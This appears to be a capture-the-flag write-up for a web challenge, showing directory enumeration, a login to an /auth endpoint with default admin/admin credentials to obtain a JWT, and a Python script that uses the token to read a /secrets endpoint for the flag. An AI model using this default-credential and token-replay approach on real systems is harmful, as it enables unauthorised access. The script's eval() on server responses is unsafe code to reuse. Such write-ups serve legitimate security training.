# authorization:Web-Misc

Flag Proof: `CTF{5b7cc033a48df4958a076286420b4a91631defa16be26409afbdf1e053367b21}`

## Summary:

- Running `feroxbuster` it reveals some directories
    - 
    
    ![Untitled](authorization%20Web-Misc%209fec13917767465e9a7e4ec7c18354e7/Untitled.png)
    

- `/auth` endpoint only accepts `POST` requests

 

![Untitled](authorization%20Web-Misc%209fec13917767465e9a7e4ec7c18354e7/Untitled%201.png)

- Making an empty `POST` request we find that it expects `JSON`

```python
def _default_auth_request_handler():

    data = request.get_json()
    username = data.get(current_app.config.get('JWT_AUTH_USERNAME_KEY'), None)
    password = data.get(current_app.config.get('JWT_AUTH_PASSWORD_KEY'), None)
    criterion = [username, password, len(data) == 2]
```

- Using default params as `username` and `password` with default creds as `admin` gives us a JWT token , and after that i started to do a script, because i expected the token to expire after one second (thought that `exp` and `iat` values were the same, but they aren’t)
- Now `/secrets` endpoint comes in, which needs an access token
    - Using the `Authorization: JWT <token>` header gives us the flag

```python
import requests
from requests.structures import CaseInsensitiveDict

data = {"username":"admin","password":"admin"}

proxy ={
	'http':'127.0.0.1:8080'
}

r = requests.post('http://34.107.45.139:31682/auth',json=data)

#print(r.text)

json = eval(r.text)
#print(json["access_token"])

token = json["access_token"]
headers = CaseInsensitiveDict()

headers["Authorization"] = "JWT {}".format(token)

r = requests.get('http://34.107.45.139:31682/secrets',headers=headers)
print(r.text)
```

![Untitled](authorization%20Web-Misc%209fec13917767465e9a7e4ec7c18354e7/Untitled%202.png)
